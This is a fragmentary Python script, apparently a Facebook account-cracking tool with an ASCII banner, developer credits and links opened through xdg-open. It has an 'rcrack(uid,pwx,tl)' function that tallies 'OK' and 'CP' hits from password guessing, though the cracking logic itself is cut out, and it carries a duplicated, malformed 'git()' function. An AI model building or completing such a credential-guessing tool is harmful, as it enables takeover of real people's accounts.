...
________     __        __     ___      ___           __      ___        __     
 /"       )   /""\      |" \   |"  \    /"  |         /""\    |"  |      |" \    
(:   \___/   /    \     ||  |   \   \  //   |        /    \   ||  |      ||  |   
 \___  \    /' /\  \    |:  |   /\\  \/.    |       /' /\  \  |:  |      |:  |   
  __/  \\  //  __'  \   |.  |  |: \.        |      //  __'  \  \  |___   |.  |   
...
{B} [{R}✔{B}] {Y}DEVELOPER  :{G}  PAHTOON CREATER 

{B} [{R}✔{B}] {B}FACEBOOK   :{G} saim ali

{B} [{R}✔{B}] {nb}WHATSAPP   :{G} anonymous number

{B} [{R}✔{B}] {R}VERSION    :{G} 0.0.1

{Y}*******************************************************"""

def fb():

    s("xdg-open https://www.facebook.com/S3FAT.004")

def git():

    s(" os.system('xdg-open https://github.com/Real-Asifo')")

def git():

    s("xdg-open https://github.com/Real-Asifo")
...
def o():
    ...
    if opt == '1':
        ...
        s("xdg-open https://www.facebook.com/profile.php?id=100001637004998")
...
def rcrack(uid,pwx,tl):
    ...
    try:
        ...
        sys.stdout.write('\r %s[SAIM] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
